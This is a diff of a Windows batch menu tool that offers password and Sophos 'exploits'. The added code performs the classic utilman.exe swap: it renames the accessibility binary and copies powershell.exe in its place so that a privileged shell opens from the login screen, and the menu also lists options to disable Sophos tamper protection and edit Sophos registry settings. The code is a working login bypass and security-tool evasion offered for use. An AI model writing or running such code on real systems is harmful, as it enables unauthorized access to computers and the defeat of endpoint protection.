@@ -38,20 +38,21 @@ echo ^|==================================^| & echo: & echo:
 
 echo +++++ Password Exploit
 echo ^[1^] Local Password Exploit
-echo ^[2^] Undo Password Exploit
-echo ^[3^] Restore Original Files
+echo ^[2^] Local Password Exploit  ^- PowerShell method
+echo ^[3^] Undo Password Exploit
+echo ^[4^] Restore Original Files
 
 echo: & echo +++++ Sophos Exploit
-echo ^[4^] Disable Sophos Tamper Protection
-echo ^[5^] Sophos Registry Exploit
+echo ^[5^] Disable Sophos Tamper Protection
+echo ^[6^] Sophos Registry Exploit
 
 echo: & echo +++++ Other
-echo ^[6^] Show On-Screen Keyboard
+echo ^[7^] Show On-Screen Keyboard
 echo: & echo +++++ Exit
 echo ^[0^] Exit
 echo: & echo: & echo:
 
-set validOptions=0 1 2 3 4 5 6
+set validOptions=0 1 2 3 4 5 6 7
 set "crackType="
 set /p "crackType=^>"
 
@@ -80,22 +81,25 @@ if "!crackType!" EQU "1" (
   call :local-password-exploit
 )
 
-if "!crackType!" EQU "2" (
+IF "!crackType!" EQU "2" (
+  call :local-password-exploit-powershell
+)
+if "!crackType!" EQU "3" (
   call :undo-password-exploit
 )
 
-if "!crackType!" EQU "3" (
+if "!crackType!" EQU "4" (
   call :restore-original-files
 )
 
-if "!crackType!" EQU "4" (
+if "!crackType!" EQU "5" (
   call :disable-sophos-tamper-protection
 )
-if "!crackType!" EQU "5" (
+if "!crackType!" EQU "6" (
   call :sophos-registry-exploit
 )
 
-if "!crackType!" EQU "6" (
+if "!crackType!" EQU "7" (
   echo Running OSK.exe...
   start "" "C:\windows\system32\osk.exe" || goto :cmdFail
   color 0A
@@ -139,6 +143,38 @@ if exist "c:\windows\system32" (
   goto menu
 )
 
+:local-password-exploit-powershell
+cls
+echo Starting Hack...
+echo. 
+set "UtilmanPath=C:\Windows\System32\utilman.exe"
+set "UtilmanOldPath=C:\Windows\System32\utilman.old"
+set "PowershellPath=C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe"
+
+if exist "%UtilmanOldPath%" (
+  echo Deleting existing utilman.old
+  del "%UtilmanOldPath%"
+)
+
+if exist "%UtilmanPath%" (
+  echo Renaming utilman.exe to utilman.old 
+  ren "%UtilmanPath%" utilman.old 
+  echo. 
+  echo Copying powershell.exe to utilman.exe 
+  copy "%PowershellPath%" "%UtilmanPath%"
+) else (
+  call :showDinoError
+  echo Utilman.exe not found in the specified path: "%UtilmanPath%"
+  echo Failing exploit and returning to menu
+  timeout /t 5 
+  goto menu 
+)
+
+echo -----------------------------------
+color 0A
+echo Exploit Completed ^| No errors
+pause
+goto menu
 
 rem Option 4 is for the Sophos registry hack. This will use xcopy to make a new folder at C:\SophosUtility
 rem It will next copy the sophos folder inside that directory.
